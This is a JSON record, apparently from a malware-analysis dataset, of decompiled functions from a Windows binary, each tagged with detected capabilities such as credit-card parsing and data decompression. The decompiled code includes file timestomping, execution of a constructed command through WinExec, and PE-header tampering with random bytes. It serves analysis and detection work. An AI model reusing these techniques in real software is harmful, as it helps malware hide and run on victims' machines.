{
    "00401000": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004010df) overlaps instruction at (ram,0x004010dd)\n// \n// WARNING: Removing unreachable block (ram,0x004010dd)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401000(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint var_1ch;\n    uint var_14h;\n    int32_t var_4h;\n    \n    // [00] -r-x section size 20480 named .text\n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x407048;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &var_12ch;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    iVar2 = var_4h;\n    if ((arg_ch == -1) && (iVar2 = fcn.00403700(arg_8h),  iVar2 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &var_1ch, &var_14h);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1237
    },
    "00401760": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00401760(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x425740 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.004035f0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4072e4, acStack1304, &uStack2112);\n    uStack2088 = 0x40736c;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x407384;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    iVar2 = -1;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.004016a0(auStack1564, 0x4072e0);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1847
    },
    "00403440": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403556) overlaps instruction at (ram,0x00403555)\n// \n// WARNING: Removing unreachable block (ram,0x004035d5)\n// WARNING: Removing unreachable block (ram,0x004034e6)\n\nuint32_t * __fastcall fcn.00403440(uint param_1, int32_t *param_2, int32_t *param_3)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t extraout_ECX;\n    int32_t *unaff_EBX;\n    uchar *puVar5;\n    int32_t *unaff_ESI;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    int32_t *piVar8;\n    int32_t *piVar9;\n    bool bVar10;\n    char in_SF;\n    char in_OF;\n    unkbyte10 in_ST0;\n    uint uStack8;\n    \n    puVar5 = &stack0xfffffffc;\n    uStack8 = param_1;\n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        *(in_EAX + -0x7ce92414) = in_ST0;\n        *param_2 = *param_2 + 0x758bdf84;\n        *(unaff_ESI + -0x7f) = *(unaff_ESI + -0x7f) | in_EAX + -1 >> 8;\n        puVar5 = &uStack8 + 3;\n        bVar10 = puVar5 == NULL;\n        param_2 = unaff_EBX;\n    }\n    else {\n        bVar10 = *param_3 == 0x5a4d;\n        unaff_ESI = param_3;\n    }\n    if (!bVar10) {\n        return NULL;\n    }\n    bVar10 = CARRY4(unaff_ESI[0xf], unaff_ESI);\n    puVar2 = unaff_ESI[0xf] + unaff_ESI;\n    if ((!bVar10) && (bVar10)) {\n        out(0xbd, puVar2);\n        return puVar2;\n    }\n    if (*puVar2 != 0x4550) {\n        return NULL;\n    }\n    if ((0x4550 < *puVar2) && (*puVar2 < 0x4551)) {\n        puVar2 = puVar2 & 0xe2f4cc58;\n    }\n    uVar4 = puVar2[0x16];\n    if (uVar4 != 0) {\n        return NULL;\n    }\n    puVar2 = unaff_ESI + 0xf;\n    uVar1 = *puVar2;\n    bVar10 = SBORROW4(*puVar2, 0x80);\n    if (uVar1 < 0x81) {\n        return NULL;\n    }\n    if ((uVar1 < 0x80) || (piVar9 = 0x40,  uVar1 >= 0x80)) {\n        uVar6 = unaff_ESI[0xf];\ncode_r0x00403511:\n        piVar9 = 0x40;\n        bVar10 = SBORROW4(uVar6, 0xc0);\n        if (uVar6 < 0xc0) {\n            piVar9 = uVar6 - 0x80;\n        }\n        if (!bVar10) goto code_r0x00403522;\ncode_r0x00403533:\n        param_2 = func_0x00404ff6(piVar9);\n        uVar4 = extraout_ECX;\n    }\n    else {\n        uVar4 = 0xffffffff;\n        if (*puVar2 != 0x80) {\n            *0x40 = unaff_ESI + 1;\n            param_2 = *unaff_ESI >> 0x1f;\n            uVar6 = 0x8bb8ec44;\n            if (uVar1 < 0x81) goto code_r0x0040354d;\n            goto code_r0x00403511;\n        }\ncode_r0x00403522:\n        if (!bVar10) goto code_r0x00403533;\n    }\n    uVar1 = *(uVar4 + 0x87cb1757);\n    puVar5 = 0x8b00001a;\n    piVar8 = unaff_EBX + -0xb5ebecf;\n    *piVar8 = *piVar8 << 1 | *piVar8 < '\\0';\n    *0x8b000016 = param_2;\n    if ((uVar4 & uVar1) == 0) {\n        return 0x98;\n    }\ncode_r0x0040354d:\n    do {\n        piVar8 = NULL;\n        if (piVar9 != NULL) {\n            do {\n                iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n                param_2 = *(puVar5 + -4);\n                piVar7 = piVar8 + 1;\n                *(piVar8 + param_2) = iVar3 % 0xff;\n                piVar8 = piVar7;\n            } while (piVar7 < piVar9);\n        }\n        piVar8 = param_2;\n        piVar7 = *(puVar5 + 8) + 0x80;\n        for (uVar4 = piVar9 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *piVar7 = *piVar8;\n            piVar8 = piVar8 + 1;\n            piVar7 = piVar7 + 1;\n        }\n        uVar4 = piVar9 & 3;\n        bVar10 = uVar4 != 0;\n        piVar9 = piVar7;\n        for (; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *piVar9 = *piVar8;\n            piVar8 = piVar8 + 1;\n            piVar9 = piVar9 + 1;\n        }\n    } while ((bVar10) && (!bVar10));\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__(param_2);\n    return 0x1;\n}\n",
        "token_count": 1411
    },
    "00403650": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403650(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00401c10(arg_8h, arg_ch, &var_8h, &var_4h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(iVar1 + 0x58) = var_4h;\n    fcn.00401c10(arg_8h, arg_ch, &var_8h, &var_4h);\n    return 1;\n}\n",
        "token_count": 161
    },
    "00404020": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404352) overlaps instruction at (ram,0x0040434f)\n// \n// WARNING: Removing unreachable block (ram,0x00404066)\n\nvoid __fastcall fcn.00404020(uint16_t param_1)\n\n{\n    uint8_t *puVar1;\n    uchar uVar2;\n    int16_t iVar3;\n    uint32_t *puVar4;\n    char *pcVar5;\n    uint8_t uVar6;\n    uint32_t extraout_ECX;\n    uint extraout_ECX_00;\n    uint8_t extraout_CH;\n    uint extraout_ECX_01;\n    uint8_t extraout_DL;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    uint8_t unaff_BL;\n    uint32_t unaff_EBP;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uchar *puVar7;\n    uint *puVar8;\n    uchar uVar9;\n    bool bVar10;\n    char cVar11;\n    char cVar12;\n    bool bVar13;\n    uint64_t uVar14;\n    uint in_stack_ffffffb8;\n    uint in_stack_ffffffbc;\n    uint in_stack_ffffffc0;\n    uint32_t arg_14h;\n    uint arg_10h;\n    int32_t iVar15;\n    uint uVar16;\n    uint uVar17;\n    uint arg_14h_00;\n    ushort uVar18;\n    ushort uVar19;\n    \n    cVar12 = '\\0';\n    cVar11 = (param_1 | 0x31fd) < 0;\n    uVar2 = fcn.00404b80(0x407490, 0xb, 0x407010, 0x11);\n    if ((cVar12 == cVar11) && (cVar12 != cVar11)) {\n        unaff_ESI = unaff_ESI + -1;\n        puVar7 = unaff_EDI | unaff_EBP;\n        unaff_EDI = puVar7 + 1;\n        *puVar7 = uVar2;\n    }\n    fcn.00404b80(0x407490, 0xb, 0x40722c, 0xf);\n    fcn.00404b80(0x407490, 0xb, 0x40723c, 0x1a);\n    bVar13 = SBORROW4(extraout_ECX & 0xffff0000 | CONCAT11((extraout_ECX >> 8) - unaff_BL, extraout_ECX), extraout_EDX);\n    uVar17 = 0x4040d8;\n    fcn.00404b80(0x407490, 0xb, 0x407290, 10);\n    if ((bVar13) || (!bVar13)) {\n        uVar17 = 0xb;\n    }\n    fcn.00404b80(0x407490, 0xb, 0x40729c, uVar17);\n    uVar2 = 0;\n    uVar9 = (extraout_DL & unaff_BL) == 0;\n    fcn.00404b80(0x407490, 0xb, 0x4072a8, 8);\n    fcn.00404b80(0x407490, 0xb, 0x4072b0, 9);\n    if ((!uVar2 && !uVar9) && (uVar2 || uVar9)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    arg_10h = 0x4072bc;\n    uVar17 = 0xb;\n    arg_14h = 0x404182;\n    fcn.00404b80(0x407490, 0xb, 0x4072bc, 9);\n    fcn.00404b80(0x407490, 0xb, 0x4072c8, 9);\n    fcn.00404b80(0x407490, 0xb, 0x4072d4, 0xc);\n    fcn.00404b80(0x407490, 0xb, 0x4072e0, 3);\n    uVar18 = 10;\n    uVar19 = 0;\n    while( true ) {\n        fcn.00404b80(0x407490, 0xb, 0x4072e4, CONCAT22(uVar19, uVar18));\n        bVar13 = 0xffffffef < &stack0xffffffe8;\n        puVar4 = fcn.00404b80(0x407490, 0xb, 0x4072f0, 0x40);\n        if ((bVar13) || (!bVar13)) break;\n        uVar18 = 0xc08b;\n        uVar19 = 0xb7f8;\n        if (&stack0xffffffe8 < *puVar4 || puVar4 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    fcn.00404b80(0x407490, 0xb, 0x407330, 0xc);\n    fcn.00404b80(0x407490, 0xb, 0x40733c, 0xb);\n    iVar3 = fcn.00404b80(0x407490, 0xb, 0x407348, 4);\n    bVar13 = false;\n    bVar10 = ((unaff_EDI | 0x74e3) - iVar3 & 0x1a8) == 0;\n    arg_14h_00 = 0x404327;\n    fcn.00404b80(0x407490, 0xb, 0x40734c, 4);\n    uVar6 = extraout_ECX_00 >> 8;\n    if ((bVar13 || bVar10) || (!bVar13 && !bVar10)) {\n        arg_14h_00 = 0xc;\n        unaff_EBP = 0x407350;\n        uVar16 = 0xb;\n        iVar15 = extraout_EDX_00;\n        goto code_r0x00404347;\n    }\n    puVar8 = unaff_EDI + 1;\n    *unaff_EDI = *unaff_ESI;\n    bVar13 = false;\n    uVar14 = CONCAT44(extraout_EDX_00, &stack0xffffffe8) | 0x68;\n    uVar16 = extraout_ECX_00;\n    unaff_ESI = unaff_ESI + 1;\n    do {\n        iVar15 = uVar14 >> 0x20;\n        uVar6 = uVar16 >> 8;\n        arg_14h = arg_14h & 0xffff | puVar8 << 0x10;\n        unaff_EDI = puVar8 & 0xffff;\n        if (!bVar13) break;\n        pcVar5 = uVar14 + 1;\n        uVar16 = 0xb7f8c08b;\n        if (&stack0xffffffc8 < *uVar14 || pcVar5 == NULL) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *pcVar5 = *pcVar5 + pcVar5;\ncode_r0x00404347:\n        puVar1 = iVar15 + 0xb;\n        bVar13 = CARRY1(*puVar1, uVar6);\n        *puVar1 = *puVar1 + uVar6;\n        cVar11 = fcn.00404b80(0x407490, uVar16, unaff_EBP, arg_14h_00);\n        if ((bVar13) || (!bVar13)) {\n            iVar15 = 4;\n            arg_10h = 0x40735c;\n            uVar17 = 0xb;\n        }\n        else {\n            *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6a27e95e;\n            iVar15 = extraout_EDX_01;\n            if (cVar11 + '\\r' + (bVar13 == false) < 0x98) goto code_r0x004043b3;\n        }\n        puVar1 = extraout_EDX_01 + 0xb;\n        bVar13 = CARRY1(*puVar1, extraout_CH);\n        *puVar1 = *puVar1 + extraout_CH;\n        arg_14h = 0x404380;\n        uVar14 = fcn.00404b80(0x407490, uVar17, arg_10h, iVar15);\n        uVar16 = extraout_ECX_01;\n        puVar8 = unaff_EDI;\n    } while (!bVar13);\n    arg_14h = 9;\n    in_stack_ffffffc0 = 0x407360;\n    in_stack_ffffffbc = 0xb;\n    in_stack_ffffffb8 = 0x407490;\ncode_r0x004043b3:\n    fcn.00404b80(in_stack_ffffffb8, in_stack_ffffffbc, in_stack_ffffffc0, arg_14h);\n    fcn.00404b80(0x407490, 0xb, 0x40736c, 0x16);\n    fcn.00404b80(0x407490, 0xb, 0x407384, 7);\n    return;\n}\n",
        "token_count": 2173
    },
    "00404800": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004049bf) overlaps instruction at (ram,0x004049bc)\n// \n// WARNING: Removing unreachable block (ram,0x00404913)\n// WARNING: Removing unreachable block (ram,0x004048b5)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.00404800(uchar *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    uint16_t uVar4;\n    uint32_t in_EDX;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint32_t unaff_EBX;\n    uchar *puVar7;\n    uchar *unaff_ESI;\n    uchar *puVar8;\n    uchar *puVar9;\n    uint32_t unaff_EDI;\n    ushort in_ES;\n    uint16_t in_SS;\n    bool bVar10;\n    bool bVar11;\n    bool bVar12;\n    uint32_t uStack56;\n    uint16_t uStack32;\n    ushort uStack30;\n    ushort uStack28;\n    uint16_t uStack26;\n    ushort uStack24;\n    ushort uStack22;\n    uint16_t uVar13;\n    uint32_t uVar14;\n    \n    puVar7 = &stack0xfffffffc;\n    uStack32 = unaff_EBX;\n    *arg_8h = 0x1b;\n    uStack32 = in_EAX ^ uStack32;\n    bVar10 = (POPCOUNT(uStack32 & 0xff) & 1U) != 0;\n    arg_8h[1] = 0xec;\n    if (((bVar10) && (!bVar10)) || (arg_8h[2] = 0x9d,  uVar3 = in_EAX,  uStack32 != 0)) {\n        unaff_ESI = 0x34a96cf4;\n        puVar7 = *0xc617b43a;\n        arg_8h = arg_8h + 1;\n        uVar6 = unaff_EBX;\n        uVar5 = uVar6 + puVar7[0x5e560876];\n        unaff_EBX = unaff_EBX & 0xffffff00 | uVar5;\n        uVar3 = in_EDX + 1;\n        in_EDX = in_EAX;\n        if (CARRY1(uVar6, puVar7[0x5e560876]) || uVar5 == 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    arg_8h[3] = 0xe;\n    uStack22 = unaff_EBX >> 0x10;\n    uVar6 = unaff_EBX >> 8 ^ 0x16 | uVar3 >> 8;\n    uVar5 = in_EDX >> 8;\n    bVar12 = SBORROW1(uVar6, uVar5);\n    bVar11 = uVar6 - uVar5 < '\\0';\n    bVar10 = uVar6 == uVar5;\n    arg_8h[4] = 0x5c;\n    uVar14 = uVar3;\n    if (bVar10) {\ncode_r0x0040487c:\n        uVar13 = uVar14;\n        arg_8h[5] = 0xff;\n        if (uVar5 < uVar6) goto code_r0x00404885;\n    }\n    else {\n        uVar14 = uVar3 & 0xffff;\n        uVar2 = arg_8h << 0x10;\n        arg_8h = (arg_8h >> 8 & 0xffff00) << 8 | arg_8h & 0xffff;\n        if (!bVar10) goto code_r0x0040487c;\n        unaff_EDI = uVar2 | in_SS;\n        uVar13 = 0x47;\n        bVar12 = SCARRY4(uVar3, 0x660c7eff);\n        uVar3 = uVar3 + 0x660c7eff;\n        bVar11 = uVar3 < 0;\n        bVar10 = uVar3 == 0;\ncode_r0x00404885:\n        if (bVar10 || bVar12 != bVar11) {\n            uStack26 = in_EDX >> 0x10;\n            uStack24 = in_ES;\n            goto code_r0x00404897;\n        }\n    }\n    arg_8h[6] = 0x25;\n    uStack24 = unaff_EDI;\n    uStack22 = unaff_EDI >> 0x10;\n    uStack26 = uVar3;\ncode_r0x00404897:\n    uVar4 = in_EDX - 1U & arg_8h;\n    bVar10 = uVar4 == 0;\n    arg_8h[7] = 0x77;\n    arg_8h[8] = 0x62;\n    if ((!bVar10) && (bVar10)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    arg_8h[9] = 0x6c;\n    puVar8 = unaff_ESI;\n    if ((!bVar10) && (bVar10)) {\n        uStack26 = uStack26 & 0xff00 | *0x4bb148d3;\n        puVar8 = unaff_ESI + 1;\n        out(*unaff_ESI, in_EDX);\n    }\n    arg_8h[10] = 0xa2;\n    if ((-1 < uVar4) && (-1 >= uVar4)) {\n        puVar8 = puVar8 + -1;\n        *(CONCAT22(uStack22, uStack24) | puVar7) = uStack26;\n        in_EDX = in_EDX & 0xffffff00;\n        bVar10 = uStack26 + (uStack26 >> 8) * 'y' == '\\0';\n        in_SS = uVar13;\n    }\n    arg_8h[0xb] = 0xf1;\n    uStack28 = in_EDX;\n    puVar9 = puVar8;\n    if ((!bVar10) && (bVar10)) {\n        puVar9 = puVar8 + 1;\n        out(*puVar8, uStack28);\n    }\n    arg_8h[0xc] = 99;\n    iVar1 = *(puVar7 + 8);\n    *(iVar1 + 0xd) = 0x5f;\n    uStack30 = in_EDX >> 0x10;\n    uVar3 = *(puVar7 + 8);\n    *(uVar3 + 0xe) = 0x23;\n    *(uVar3 + 0xf) = 0x9f;\n    bVar10 = ((CONCAT11((iVar1 >> 8) + -0x2b, iVar1) ^ 0x3d) + 0x7c28 ^ CONCAT11(in_EDX >> 8 | in_EDX, in_EDX)) ==\n             0x4001;\n    *(uVar3 + 0x10) = 3;\n    if ((bVar10) || (uVar3 = (uVar3 >> 8 & 0xffff00) << 8 | uVar3 & 0xffff,  uStack26 = uStack30,  !bVar10)) {\n        *(uVar3 + 0x11) = 0xbe;\n        uStack28 = uVar3;\n        uStack26 = uVar3 >> 0x10;\n    }\n    uStack56 = uStack56 & 0xffff0000 | in_SS;\n    *(puVar9 + -0x3c0899a0) = *(puVar9 + -0x3c0899a0) + uStack56;\n    **(puVar9 + 0xc) = 0x12;\n    return CONCAT44(unaff_EBX, CONCAT22(uStack26, uStack28));\n}\n",
        "token_count": 1830
    },
    "00401150": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401169) overlaps instruction at (ram,0x00401165)\n// \n\nulong __cdecl fcn.00401150(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint in_ECX;\n    int32_t *in_EDX;\n    uint8_t in_CF;\n    uint8_t in_AF;\n    char in_SF;\n    char in_OF;\n    unkbyte10 in_ST0;\n    \n    if ((in_OF != in_SF) || (in_OF == in_SF)) {\n        in_EAX = arg_8h;\n    }\n    *(in_EAX + -0x7ce92414) = in_ST0;\n    uVar2 = in_EAX - 1U;\n    uVar1 = 9 < (uVar2 & 0xf) | in_AF;\n    uVar2 = uVar2 + uVar1 * '\\x06';\n    *in_EDX = *in_EDX + 0x458bdf84;\n    *in_EDX = *in_EDX | in_ECX >> 8;\n    iVar3 = (*_sym.imp.MSVCRT.dll__access)\n                      (in_EAX - 1U & 0xffffff00 | uVar2 + (0x90 < (uVar2 & 0xf0) | in_CF | uVar1 * (0xf9 < uVar2)) * '`'\n                      );\n    if (iVar3 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 358
    },
    "00401b80": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00401b80(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.00404ec0(0x80000002, 0x4072f0, 0x407330, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 152
    },
    "004027f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
